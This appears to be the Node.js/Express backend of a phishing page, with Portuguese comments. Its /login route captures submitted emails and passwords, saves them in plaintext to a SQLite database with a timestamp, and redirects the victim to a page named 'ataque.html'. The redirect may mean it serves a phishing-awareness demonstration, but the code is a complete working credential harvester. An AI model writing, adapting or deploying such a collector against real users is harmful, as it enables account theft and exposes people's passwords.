const express = require('express')
const path = require('path')
const sqlite3 = require('sqlite3').verbose();

const app = express()
const PORT = 3000

// Middleware para ler dados de formulários
app.use(express.urlencoded({ extended: true }))

// Servir arquivos HTML e CSS
app.use(express.static(path.join(__dirname)))

// Criar/conectar banco SQLite
const db = new sqlite3.Database('./usuarios.db');

// Criar tabela se não existir (agora sem DEFAULT)
db.run(`
  CREATE TABLE IF NOT EXISTS usuarios (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT NOT NULL,
    senha TEXT NOT NULL,
    timestamp TEXT
  )
`);

// Rota para capturar dados do formulário
app.post('/login', (req, res) => {
  const { email, senha } = req.body;

  // Gera a data/hora no fuso de São Paulo
  const dataHora = new Date().toLocaleString("pt-BR", {
    timeZone: "America/Sao_Paulo"
  });

  db.run(
    `INSERT INTO usuarios (email, senha, timestamp) VALUES (?, ?, ?)`,
    [email, senha, dataHora],
    (err) => {
      if (err) {
        console.error('Erro ao inserir:', err.message);
        return res.status(500).send('Erro ao salvar os dados');
      }

      // Redireciona para a página de ataque
      res.redirect('/ataque.html');
    }
  );
});

app.listen(PORT, () => {
  console.log(`Servidor rodando em: http://localhost:${PORT}`)
})
